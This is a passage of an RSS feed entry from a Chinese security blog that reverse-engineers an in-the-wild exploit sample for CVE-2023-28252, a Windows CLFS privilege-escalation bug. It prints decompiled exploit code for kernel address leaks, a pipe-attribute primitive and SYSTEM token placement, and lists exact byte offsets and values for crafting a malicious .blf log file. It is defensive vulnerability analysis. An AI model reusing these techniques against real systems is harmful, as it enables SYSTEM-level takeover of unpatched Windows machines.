<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Windows CLFS EoP on chestnut's blog</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/windows-clfs-eop/</link><description>Recent content in Windows CLFS EoP on chestnut's blog</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Wed, 10 May 2023 00:40:54 +0800</lastBuildDate><atom:link href="https://www.ch35tnut.site/zh-cn/vulnerability/windows-clfs-eop/index.xml" rel="self" type="application/rss+xml"/><item><title>CVE-2023-28252</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/windows-clfs-eop/cve-2023-28252/</link><pubDate>Wed, 31 May 2023 19:44:15 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/windows-clfs-eop/cve-2023-28252/</guid><description><h3 id="基本信息">基本信息</h3><p>clfs中存在权限提升漏洞。</p><h3 id="影响版本">影响版本</h3><p>略</p><h3 id="环境搭建">环境搭建</h3><ul><li>windows 10 21h2 19044.2728</li><li>windbg</li><li>x64dbg</li></ul><h3 id="技术分析调试">技术分析&amp;调试</h3><p><strong>静态分析</strong></p><p>样本加了Themida的壳，参考<a href="https://github.com/VenTaz/Themidie" target="_blank">https://github.com/VenTaz/Themidie</a>对其进行绕过。</p><p>脱壳之后dump出原始样本进行分析，如下。核心逻辑在InitAndHeapSpray函数中：</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span><span style="color:#66d9ef">__cdecl</span><span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc,<span style="color:#66d9ef">const</span><span style="color:#66d9ef">char</span><span style="color:#f92672">**</span>argv,<span style="color:#66d9ef">const</span><span style="color:#66d9ef">char</span><span style="color:#f92672">**</span>envp)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span>.....</span></span><span style="display:flex;"><span> v3<span style="color:#f92672">=</span><span style="color:#a6e22e">InitAndHeapSpray</span>();</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">sub_7FF662B24F98</span>() )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_20;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>v4 )</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662B28D3C</span>();</span></span><span style="display:flex;"><span><span style="color:#a6e22e">LOBYTE</span>(v10)<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662B24CA4</span>(v10,<span style="color:#ae81ff">0</span>i64);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> v3;</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>该函数首先清空工作目录，而后通过查询注册表获取系统版本，在通过NtQuerySystemInformation函数并传入SystemExtendedHandleInformation参数来获取System及自身token地址，其逻辑和CVE-2022-37969基本一样</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662B265E4</span>((<span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">NtCurrentTeb</span>()<span style="color:#f92672">-></span>NtTib.FiberData<span style="color:#f92672">+</span> v0);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">"del /f C:</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">Users</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">Public</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.contain* 2> nul 1> nul"</span>);<span style="color:#75715e">// 删除文件</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">"del /f C:</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">Users</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">Public</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">MyLog* 2> nul 1> nul"</span>);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">"del /f C:</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">Users</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">Public</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">p_* 2> nul 1> nul"</span>);</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>dwProcessId<span style="color:#f92672">=</span><span style="color:#a6e22e">GetCurrentProcessId</span>();</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">CheckOSVersion</span>() )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">GetObjectKernelAddress</span>() )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662B21010</span>((<span style="color:#66d9ef">__int64</span>)<span style="color:#e6db74">"fail RW</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n"</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>而后初始化并获取一系列内核函数地址，包括ClfsEarlierLsn、ClfsMgmtDeregisterManagedClient、SeSetAccessStateGenericMapping、RtlClearBit，获取方式和CVE-2022-37969基本一样。通过LoadLibraryEx在r3载入ntoskrnl.exe、clfs.sys获取到函数相对于基址的偏移，而后通过NtQuerySystemInformation并传入SystemModuleInformation获取到内核载入的所有模块的基址。通过比较模块的FullPathName来确定clfs.sys和ntoskrnl.exe在内核的基址，将内核基址和函数偏移相加即可获得函数在内核的地址</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>ClfsEarlierLsnKernelAddress<span style="color:#f92672">=</span> (<span style="color:#66d9ef">__int64</span>)<span style="color:#a6e22e">GetKernelFuncAddr</span>(<span style="color:#e6db74">"ClfsEarlierLsn"</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>ClfsEarlierLsnKernelAddress )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> ClfsMgmtDeregisterManagedClientAddress<span style="color:#f92672">=</span> (<span style="color:#66d9ef">__int64</span>)<span style="color:#a6e22e">GetKernelFuncAddr</span>(<span style="color:#e6db74">"ClfsMgmtDeregisterManagedClient"</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( versionFlag )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> ntoskrnl_KernelBase<span style="color:#f92672">=</span><span style="color:#a6e22e">FindKernelModulesBase</span>(<span style="color:#e6db74">"</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">SystemRoot</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">system32</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">ntoskrnl.exe"</span>);</span></span><span style="display:flex;"><span> Library<span style="color:#f92672">=</span><span style="color:#a6e22e">LoadLibraryExW</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">"ntoskrnl.exe"</span>,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">1u</span>);</span></span><span style="display:flex;"><span> v4<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> v5<span style="color:#f92672">=</span> (<span style="color:#66d9ef">__int64</span>)Library;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( Library )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> PoFxProcessorNotificationAddress<span style="color:#f92672">=</span><span style="color:#a6e22e">GetProcAddress</span>(Library,<span style="color:#e6db74">"PoFxProcessorNotification"</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>PoFxProcessorNotificationAddress )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_18;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662E7AF0D</span>(v5);</span></span><span style="display:flex;"><span> PoFxProcessorNotificationKernelAddress<span style="color:#f92672">=</span> (<span style="color:#66d9ef">__int64</span>)PoFxProcessorNotificationAddress</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span> (_QWORD)ntoskrnl_KernelBase</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span> v5;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> PoFxProcessorNotificationKernelAddress<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> PoFxProcessorNotificationKernelAddress1<span style="color:#f92672">=</span> PoFxProcessorNotificationKernelAddress;</span></span><span style="display:flex;"><span> ntoskrnl_kernel_base<span style="color:#f92672">=</span><span style="color:#a6e22e">FindKernelModulesBase</span>(<span style="color:#e6db74">"</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">SystemRoot</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">system32</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">ntoskrnl.exe"</span>);</span></span><span style="display:flex;"><span> ntoskrnl_base<span style="color:#f92672">=</span><span style="color:#a6e22e">LoadLibraryExW</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">"ntoskrnl.exe"</span>,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">1u</span>);</span></span><span style="display:flex;"><span> v10<span style="color:#f92672">=</span> (<span style="color:#66d9ef">__int64</span>)ntoskrnl_base;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>ntoskrnl_base )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> SeSetAccessStateGenericMappingAddressKernelAddr<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_21;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> SeSetAccessStateGenericMappingAddress<span style="color:#f92672">=</span><span style="color:#a6e22e">GetProcAddress</span>(ntoskrnl_base,<span style="color:#e6db74">"SeSetAccessStateGenericMapping"</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( SeSetAccessStateGenericMappingAddress )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662E7AF0D</span>(v10);</span></span><span style="display:flex;"><span> SeSetAccessStateGenericMappingAddressKernelAddr<span style="color:#f92672">=</span> (<span style="color:#66d9ef">__int64</span>)SeSetAccessStateGenericMappingAddress</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span> (_QWORD)ntoskrnl_kernel_base</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span> v10;</span></span></code></pre></div><p>样本在0x5000000位置处申请大小0x100000的内存，很明显这块和CVE-2022-37969的申请内存一样，而后将ntdll.dll载入到进程中并获取NtQuerySystemInformation函数地址，通过CreateFile打开C:\Users\Public\p_%08d格式文件的句柄并验证句柄有效性，接着获取到NtFsControlFile函数地址</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">VirtualAlloc</span>((LPVOID)<span style="color:#ae81ff">0x5000000</span>,<span style="color:#ae81ff">0x100000u</span>i64,<span style="color:#ae81ff">0x3000u</span>,<span style="color:#ae81ff">4u</span>) )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> v24<span style="color:#f92672">=</span><span style="color:#a6e22e">rand</span>();</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memset</span>(v96,<span style="color:#ae81ff">0</span>,<span style="color:#66d9ef">sizeof</span>(v96));</span></span><span style="display:flex;"><span><span style="color:#a6e22e">wsprintf</span>((<span style="color:#66d9ef">__int64</span>)v96, (<span style="color:#66d9ef">__int64</span>)<span style="color:#e6db74">L</span><span style="color:#e6db74">"C:</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">Users</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">Public</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">p_%08d"</span>, v24);</span></span><span style="display:flex;"><span> Filew<span style="color:#f92672">=</span><span style="color:#a6e22e">CreateFilew</span>((<span style="color:#66d9ef">__int64</span>)v96,<span style="color:#ae81ff">0xC0000000</span>i64,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">256</span>,<span style="color:#ae81ff">0</span>i64);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( Filew<span style="color:#f92672">==</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662E75E1F</span>();</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">1</span>i64;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> ntdll_hmodule<span style="color:#f92672">=</span> (HMODULE)<span style="color:#a6e22e">LoadLibrary</span>((<span style="color:#66d9ef">__int64</span>)<span style="color:#e6db74">L</span><span style="color:#e6db74">"ntdll"</span>);</span></span><span style="display:flex;"><span> NtQuerySystemInformationAddress<span style="color:#f92672">=</span> (<span style="color:#a6e22e">NTSTATUS</span> (<span style="color:#66d9ef">__stdcall</span><span style="color:#f92672">*</span>)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG))<span style="color:#a6e22e">GetProcAddress</span>(ntdll_hmodule,<span style="color:#e6db74">"NtQuerySystemInformation"</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( NtQuerySystemInformationAddress )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> ( i<span style="color:#f92672">=</span><span style="color:#ae81ff">20</span>; ; i<span style="color:#f92672">=</span> v82 )</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>v31 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> object<span style="color:#f92672">=</span> (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">*</span>(p_UniqueProcessId<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v33<span style="color:#f92672">==</span><span style="color:#f92672">*</span>p_UniqueProcessId<span style="color:#f92672">&amp;&amp;</span> p_UniqueProcessId[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">==</span> (HANDLE)Filew )<span style="color:#75715e">// 这里获取的是前面通过CreateFile返回的句柄object</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">break</span>;</span></span><span style="display:flex;"><span> v27<span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)(v27<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>);</span></span><span style="display:flex;"><span> p_UniqueProcessId<span style="color:#f92672">+=</span><span style="color:#ae81ff">5</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">int</span>)v27<span style="color:#f92672">>=</span> v30<span style="color:#f92672">-></span>NumberOfHandles )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_46;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> qword_7FF662B44710<span style="color:#f92672">=</span> (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">*</span>(p_UniqueProcessId<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);<span style="color:#75715e">// Object</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">if</span> ( object )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_51;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span>LABEL_46:</span></span><span style="display:flex;"><span> qword_7FF662B44710<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">1</span>i64;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> qword_7FF662B44710<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>i64;</span></span><span style="display:flex;"><span>LABEL_51:</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_OWORD<span style="color:#f92672">*</span>)hReadPipe<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> Size<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">LODWORD</span>(v82)<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( versionFlag )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">LODWORD</span>(v36)<span style="color:#f92672">=</span><span style="color:#a6e22e">LoadModule</span>(<span style="color:#e6db74">"ntdll"</span>, (LPVOID)v27);</span></span><span style="display:flex;"><span> NtFsControlFileAddress<span style="color:#f92672">=</span> (<span style="color:#66d9ef">__int64</span> (<span style="color:#66d9ef">__fastcall</span><span style="color:#f92672">*</span>)(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _DWORD, _QWORD, _DWORD, _QWORD, _DWORD))<span style="color:#a6e22e">GetProcAddress</span>(v36,<span style="color:#e6db74">"NtFsControlFile"</span>);</span></span></code></pre></div><p>样本创建匿名管道并调用NtFsControlFile函数，通过传入0x11003C，使得之后我们可以再次调用NtFsControlFile并传入0x110038来获取到管道的属性，这点利用和CVE-2022-37969一样。在创建匿名管道后通过NtQuerySystemInformation函数获取到内核中的堆信息，并通过比较堆大小和tag获取到这个管道在内核中对应的堆内存。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">CreatePipe</span>(<span style="color:#f92672">&amp;</span>hReadPipe[<span style="color:#ae81ff">1</span>], hReadPipe,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">0x10000u</span>) )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662E77D93</span>(<span style="color:#ae81ff">0</span>i64);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">__debugbreak</span>();</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> Size<span style="color:#f92672">=</span> (<span style="color:#66d9ef">size_t</span>)<span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">0x2000u</span>i64);</span></span><span style="display:flex;"><span> v37<span style="color:#f92672">=</span> (_WORD<span style="color:#f92672">*</span>)Size;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memset</span>((<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)(Size<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>),<span style="color:#ae81ff">65</span>,<span style="color:#ae81ff">0xFFEu</span>i64);</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>v37<span style="color:#f92672">=</span><span style="color:#ae81ff">90</span>;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662B21B80</span>(<span style="color:#ae81ff">4096</span>,<span style="color:#e6db74">"NpAt"</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>i64);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memset</span>(v95,<span style="color:#ae81ff">66</span>,<span style="color:#ae81ff">0xFFu</span>i64);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">NtFsControlFileAddress</span>(hReadPipe[<span style="color:#ae81ff">0</span>],<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">0</span>i64, v92,<span style="color:#ae81ff">0x11003C</span>, v37,<span style="color:#ae81ff">4056</span>, v95,<span style="color:#ae81ff">256</span>);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662B21B80</span>(<span style="color:#ae81ff">4096</span>,<span style="color:#e6db74">"NpAt"</span>,<span style="color:#ae81ff">0</span>, (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int64</span><span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>qword_7FF662B440C8);</span></span></code></pre></div><p>之后在0xFFFFFFFF地址处申请0x1000大小的内存，并将system token布局到该地址，这点和CVE-2022-37969一致。在CVE-2022-37969中该处用于写入token。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">LODWORD</span>(v82)<span style="color:#f92672">=</span> system_EPROCESS<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xFFF</span>;</span></span><span style="display:flex;"><span> v38<span style="color:#f92672">=</span> system_EPROCESS<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xFFFFFFFFFFFFF000u</span>i64;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">VirtualAlloc</span>(<span style="color:#75715e">// 在0xFFFFFFFF地址申请内存</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> (LPVOID)<span style="color:#ae81ff">0xFFFFFFFF</span>i64,</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x1000u</span>i64,</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x3000u</span>,</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4u</span>) )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memset</span>((<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x100000007</span>i64,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0xFF8u</span>i64);</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0xFFFFFFFF</span>]<span style="color:#f92672">=</span> v38;<span style="color:#75715e">// 在0xFFFFFFFF写入system proc token</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> MEMORY[<span style="color:#ae81ff">0x100000007</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">0x414141414141005A</span>i64;</span></span></code></pre></div><p>在之后就是漏洞利用的核心逻辑。创建一个日志文件Mylog并对以下的偏移进行了修改并对CRC进行了修复，这里将其称之为主blf文件。</p><p>修改日志文件之后打开日志文件并通过NtQuerySystemInformation查询到这个日志文件的base block的内核地址，而后调用AddLogContainer为该文件添加容器。</p><pre tabindex="0"><code>0x80c -> crc32 4字节
0x858 -> 0x369 4字节
0x1dd0 -> 0x15a0 4字节
0x1dd4 -> 0x1570 4字节
0x1de0 -> 0xC1FDF008 4字节
0x1de4 -> 0x30 4字节
0x1df8 -> 0x5000000 4字节
0x820c -> crc32 4字节
0x8258 -> 0x369 4字节
0x97D0 -> 0x15A0 4字节
0x97D4 -> 0x1570 4字节
0x97E0 -> 0xC1FDF008 4字节
0x97E4 -> 0x30 4字节
0x97F8 -> 0x5000000 4字节</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#a6e22e">CraftFile</span>()</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span><span style="color:#a6e22e">wsprintf</span>((<span style="color:#66d9ef">__int64</span>)pszLogFileName, (<span style="color:#66d9ef">__int64</span>)<span style="color:#e6db74">L</span><span style="color:#e6db74">"LOG:C:</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">Users</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">Public</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">MyLog_%08d"</span>, (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)(v0<span style="color:#f92672">+</span><span style="color:#ae81ff">16385</span>));</span></span><span style="display:flex;"><span><span style="color:#a6e22e">wsprintf</span>((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>unk_7FF662B44110, (<span style="color:#66d9ef">__int64</span>)<span style="color:#e6db74">L</span><span style="color:#e6db74">"C:</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">Users</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">Public</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">MyLog_%08d.blf"</span>, (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)(v0<span style="color:#f92672">+</span><span style="color:#ae81ff">16385</span>));</span></span><span style="display:flex;"><span><span style="color:#f92672">::</span>pszLogFileName<span style="color:#f92672">=</span> (LPCWSTR)<span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">0x500u</span>i64);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">wsprintf</span>((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>pwszContainerPath, (<span style="color:#66d9ef">__int64</span>)<span style="color:#e6db74">L</span><span style="color:#e6db74">"C:</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">Users</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">Public</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.container_1%d"</span>, (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)(v0<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>));</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662E7B416</span>((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>unk_7FF662B44110);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662E7B416</span>((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>pwszContainerPath);</span></span><span style="display:flex;"><span> LogFile<span style="color:#f92672">=</span><span style="color:#a6e22e">CreateLogFile</span>(pszLogFileName,<span style="color:#ae81ff">0xC0010000</span>,<span style="color:#ae81ff">3u</span>,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">4u</span>,<span style="color:#ae81ff">0</span>);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CloseHandle</span>(LogFile);</span></span><span style="display:flex;"><span> Buffer<span style="color:#f92672">=</span><span style="color:#ae81ff">0x369</span>;</span></span><span style="display:flex;"><span> Filew<span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)<span style="color:#a6e22e">CreateFilew</span>((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>unk_7FF662B44110,<span style="color:#ae81ff">0xC0000000</span>i64,<span style="color:#ae81ff">7</span>i64,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>i64);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SetFilePointer</span>(Filew,<span style="color:#ae81ff">0x858</span>,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">1u</span>);</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span> Buffer<span style="color:#f92672">=</span><span style="color:#ae81ff">0x5000000</span>;</span></span><span style="display:flex;"><span> v7<span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)<span style="color:#a6e22e">CreateFilew</span>((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>unk_7FF662B44110,<span style="color:#ae81ff">0xC0000000</span>i64,<span style="color:#ae81ff">7</span>i64,<span 